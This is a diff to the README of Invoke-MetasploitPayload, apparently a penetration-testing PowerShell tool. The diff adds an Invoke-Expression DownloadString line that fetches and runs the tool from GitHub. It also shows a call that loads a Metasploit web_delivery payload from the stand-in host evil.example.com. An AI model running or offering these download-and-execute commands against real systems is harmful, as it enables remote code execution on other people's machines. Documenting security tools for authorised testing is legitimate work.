@@ -39,8 +39,14 @@ After running the web_delivery module, it will print out the URL for the webserv
 
 #### Using Invoke-MetasploitPayload.ps1
 
-Usage is simple, just pass the URL from the web_delivery module. Invoke-MetasploitPayload will handle spinning up a new process and then downloading and executing the script.
+Usage is simple, first execute the PS1 file.
 
+```
+PS> Invoke-Expression (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/jaredhaight/Invoke-MetasploitPayload/master/Inv
+oke-MetasploitPayload.ps1")
+```
+
+Then just pass the URL from the web_delivery module to Invoke-MetasploitPayload. It will handle spinning up a new process and then downloading and executing the script.
 ```
 PS> Invoke-MetasploitPayload -url "http://evil.example.com/SDFJLWKS"
 ```
